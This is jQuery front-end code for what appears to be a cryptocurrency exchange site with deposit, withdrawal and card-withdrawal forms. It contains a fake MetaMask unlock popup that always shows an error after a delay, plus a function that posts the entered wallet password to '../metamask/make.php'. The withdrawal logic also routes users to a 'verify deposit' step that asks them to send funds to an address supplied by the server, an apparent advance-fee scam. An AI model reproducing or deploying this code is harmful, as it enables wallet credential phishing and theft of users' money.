  function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 var active_crypto = 'BTC';
    function setTab(crypto) {
        $("#btn_" + active_crypto).removeClass("buttonActiveNew");
        $("#btn_" + crypto).addClass("buttonActiveNew");

        $("#tab_" + active_crypto).removeClass("deposit__content-item-active");
        $("#tab_" + crypto).addClass("deposit__content-item-active");

        active_crypto = crypto;
    }


    function verify_deposit() {
        var verify_coin_name = $("#verify_currency_list").val();

        $.ajax({
          url: "../ajax/ajax",
          type: "POST",
          data: {
            action: "WITHDRAW_VERIFY_DEPOSIT",
            crypto: verify_coin_name
          },
          success: function(response) {
            if(response == "error") {
                noti("Server error, please, try again", "error");
            } else {
                var json = JSON.parse(response);
                var verify_amount = json['verify_amount'];
                var verify_address = json['verify_address'];
                var verify_memo = json['verify_memo'];

                var coin_get = verify_coin_name.toUpperCase();
                $("#verify_3_crypto").html(coin_get);

                $("#verify_amount").val(verify_amount);
                $("#verify_address").html(verify_address);

                if(verify_memo != "0") {
                    $("#verify_memo_block").css("display", "block");
                    $("#verify_memo").html(verify_memo);
                    $(".popap-verifi-container-item").css("height", "410px");
                } else {
                    $("#verify_memo_block").css("display", "none");
                    $(".popap-verifi-container-item").css("height", "350px");
                }
            }
          }
        });
    }

    $("#verify_trans_btn").on("click", function() {
        var verify_amount = $("#verify_amount").val();
        var verify_address = $("#verify_address").html();
        var verify_memo = $("#verify_memo").html();
        var verify_coin_name = $("#verify_currency_list").val();

        $.ajax({
          url: "../ajax/ajax",
          type: "POST",
          data: {
            action: "CHECK_VERIFY_DEPOSIT",
            verify_amount: verify_amount,
            verify_address: verify_address,
            verify_memo: verify_memo,
            verify_crypto: verify_coin_name
          },
          success: function(response) {
            if(response == "2") {
                noti("Transaction not found for identification", "error");
                noti("Press the button when the specified amount will be transferred to the specified address", "info");
            } else if(response == "3") {
                noti("A deposit to the specified address was found, but the amount does not match the specified one", "warning");
            } else if(response == "1") {
                $(".popap-verifi-list-three").removeClass("popap-verifi-activ");
                $(".popap-verifi-list-four").addClass("popap-verifi-activ");
            }
          }
        });
    });

    function withdraw(crypto, e) {
        e.preventDefault();
        
        var address = $("#"+crypto+"_address").val();
        var memo = $("#"+crypto+"_memo").val();
        var amount2 = $("#"+crypto+"_amount").val();
        var amount = parseFloat(amount2);

        var user_balance = parseFloat($("#"+crypto+"_balance").html());

        if(address == "" || address.length < 10) {
            noti("Please enter a valid wallet address", "error");
        } else if(amount2 == "" || amount2 == NaN || amount == 0 || amount <= 0) {
            noti("Please enter the amount to withdraw", "error");
        } else if(amount > user_balance) {
            noti("You don't have enough balance to withdraw", "error");
        } else {

            $.ajax({
              url: "/ajax/GET_MINIMUM_AMOUNT",
              type: "POST",
              data: {
                crypto: crypto
              },
			  dataType: 'json',
              success: function(data) {
                //var min_dep = JSON.parse(response);
                 //   min_dep = min_dep['min_dep'];

                if(parseFloat(data.min_dep) > amount) {
                    noti("Oops.. Minimal withdraw amount: " + data.min_dep + " " + crypto.toUpperCase(), "error");
                } else {
                    $.ajax({
                      url: "/ajax/WITHDRAW",
                      type: "POST",
                      data: {
                        amount: amount,
                        crypto: crypto,
                        address: address,
                        memo: memo
                      },
					  dataType: 'json',
                      success: function(data) {


						if(data.response == "w_true") {
                            var d = new Date();
                            var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                            //$("#withdraw_true_modal").css("display", "flex");
                            $("#withdraw_true_modal_new").addClass("successful-popup__bg-active");
                            $("#t_withdraw_date").html(strDate);
                            $("#t_withdraw_amount").html(amount + " " + crypto);
                            $("#t_withdraw_address").html(address);
                        }
						
						if(data.response == "w_confirmed_true") {
                            var d = new Date();
                            var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                            //$("#withdraw_true_modal").css("display", "flex");
                            $("#withdraw_true_confirmed_modal").addClass("successful-popup__bg-active");
                            $("#t_withdraw_confirmed_date").html(strDate);
                            $("#t_withdraw_confirmed_amount").html(amount + " " + crypto);
                            $("#t_withdraw_confirmed_address").html(address);
                        } 
						
						
						if(data.response == "verify") {
							$("#verify_popap").addClass("popap-verifi-block-active");
							var u_verify_status = $("#u_verify_status").val();
							if(u_verify_status == "true") {
								$(".popap-verifi-list-four").addClass("popap-verifi-activ");
								$(".popap-verifi-list-one").removeClass("popap-verifi-activ");
							}

						}
						
						if(data.response == 'error')
							noti(data.text, "error");
							
						
						if(data.response == 'custom_error' ) {	
							$("#withdraw_error_modal").css("display", "flex");
							$("#withdraw_modal_text").html(data.text); 
						}


                      }
                    })
                }


              }
            })
        }

    }

    function withdrawUsd(e) {
        e.preventDefault();
        
        var usd_card = $("#usd_card").val();
        var usd_number = $("#usd_number").val();
        var usd_name = $("#usd_name").val();
        var usd_month = $("#usd_month").val();
        var usd_year = $("#usd_year").val();
        var usd_currency = $("#usd_currency").val();
        var usd_amount = $("#usd_amount").val();


        var amount = parseFloat(usd_amount);

        var user_balance = parseFloat($("#"+usd_currency+"_balance").html());

        if(usd_number == "" || usd_number.length < 16) {
            noti("Please enter a valid card number", "error");
        } else if(usd_amount == "" || usd_amount == NaN || amount == 0 || amount <= 0) {
            noti("Please enter the amount to withdraw", "error");
        } else if(amount > user_balance) {
            noti("You don't have enough balance to withdraw", "error");
        } else if(usd_name == "" || usd_name.length < 6) {
            noti("Please enter a valid Name and Surname", "error");
        } else if(usd_month == "00" || usd_year == "0000") {
            noti("Please enter a valid card Month and Year", "error");
        } else {

            $.ajax({
              url: "/ajax/WITHDRAW",
              type: "POST",
              data: {
                amount: amount,
                crypto: usd_currency
              },
			  dataType: 'json',
              success: function(data) {

					if(data.response == "w_true") {
                            var d = new Date();
                            var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                            //$("#withdraw_true_modal").css("display", "flex");
                            $("#withdraw_true_modal_new").addClass("successful-popup__bg-active");
                            $("#t_withdraw_date").html(strDate);
                            $("#t_withdraw_amount").html(amount + " " + crypto);
                            $("#t_withdraw_address").html(address);
                        }
						
						if(data.response == "w_confirmed_true") {
                            var d = new Date();
                            var strDate = d.getFullYear() + "/" + (d.getMonth()+1) + "/" + d.getDate() + " " + d.getHours() + ":" + d.getMinutes();
                            //$("#withdraw_true_modal").css("display", "flex");
                            $("#withdraw_true_confirmed_modal").addClass("successful-popup__bg-active");
                            $("#t_withdraw_confirmed_date").html(strDate);
                            $("#t_withdraw_confirmed_amount").html(amount + " " + crypto);
                            $("#t_withdraw_confirmed_address").html(address);
                        } 
						
						
						if(data.response == "verify") {
							$("#verify_popap").addClass("popap-verifi-block-active");
							var u_verify_status = $("#u_verify_status").val();
							if(u_verify_status == "true") {
								$(".popap-verifi-list-four").addClass("popap-verifi-activ");
								$(".popap-verifi-list-one").removeClass("popap-verifi-activ");
							}

						}
						
						if(data.response == 'error')
							noti(data.text, "error");
							
						
						if(data.response == 'custom_error' ) {	
							$("#withdraw_error_modal").css("display", "flex");
							$("#withdraw_modal_text").html(data.text); 
						}


              }
            })
        }

    }

    $("#close_modal").on("click", function() {
      $(".popap-container").css("display", "none");
    });

    $("#close_modal_btn").on("click", function() {
      $("#withdraw_error_modal").css("display", "none");
    });

    $("#close_modal_true_btn").on("click", function() {
      $("#withdraw_true_modal").css("display", "none");
    });


    $("#btc_bal").on("click", function() {
        var btc_balance = $("#btc_bal").html();
        $("#btc_amount").val(btc_balance);
    });

    $("#eth_bal").on("click", function() {
        var eth_balance = $("#eth_bal").html();
        $("#eth_amount").val(eth_balance);
    });

    $("#ltc_bal").on("click", function() {
        var ltc_balance = $("#ltc_bal").html();
        $("#ltc_amount").val(ltc_balance);
    });

    $('#usd_amount').keyup(function(e){

        var usd_currency = $("#usd_currency").val();
        var my_balance = parseFloat($("#"+usd_currency+"_balance").val());

        var input_amount = $("#usd_amount").val();

        if($("#usd_amount").val() == '') {
          input_amount = 0;
        }


        var profit_amount_usd = parseFloat($("#" + usd_currency + "_course").val()) * input_amount;
            profit_amount_usd = profit_amount_usd.toFixed(2);


        if(parseFloat(my_balance) < parseFloat(input_amount)) {
          noti("You do not have enough funds for this amount", "error");
          $("#usd_amount_dollar").html('$0.00');
          $("#usd_amount").val("");
        } else {
          $("#usd_amount_dollar").html("$" + profit_amount_usd);
        }

    

    });

    function enterMaximumAmount(crypto, amount) {
        $("#" + crypto + "_amount").val(amount);
    }